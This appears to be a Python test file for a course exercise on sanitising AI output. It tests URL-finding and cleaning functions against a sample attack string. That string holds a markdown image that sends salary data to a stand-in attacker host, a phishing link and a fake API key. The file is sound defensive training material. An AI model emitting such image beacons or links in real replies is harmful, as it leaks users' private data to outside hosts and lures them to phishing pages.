from quests.day73.leaks import find_urls, problems, sanitise

ALLOWED = {"rynovi.dev", "docs.rynovi.dev"}
ATTACK = ("Here is your summary. ![chart](https://evil.example/c.png?d=salary-bands) "
          "See [the policy](https://docs.rynovi.dev/leave) or [click here](http://phish.example/login). "
          "Debug key: sk-abcdefghijklmnopqrstuvwx ![logo](https://rynovi.dev/logo.png)")


def test_73_1_find():
    assert find_urls(ATTACK) == [
        ("image", "https://evil.example/c.png?d=salary-bands"),
        ("link", "https://docs.rynovi.dev/leave"),
        ("link", "http://phish.example/login"),
        ("image", "https://rynovi.dev/logo.png"),
    ]


def test_73_2_problems():
    assert problems(ATTACK, ALLOWED) == ["image from evil.example", "link to phish.example", "secret"]
    assert problems("All good [docs](https://docs.rynovi.dev/x)", ALLOWED) == []


def test_73_3_sanitise():
    out = sanitise(ATTACK, ALLOWED)
    assert "evil.example" not in out and "phish.example" not in out and "sk-" not in out
    assert "[image removed]" in out and "click here" in out and "[secret removed]" in out
    assert "[the policy](https://docs.rynovi.dev/leave)" in out and "![logo](https://rynovi.dev/logo.png)" in out
    assert problems(out, ALLOWED) == []
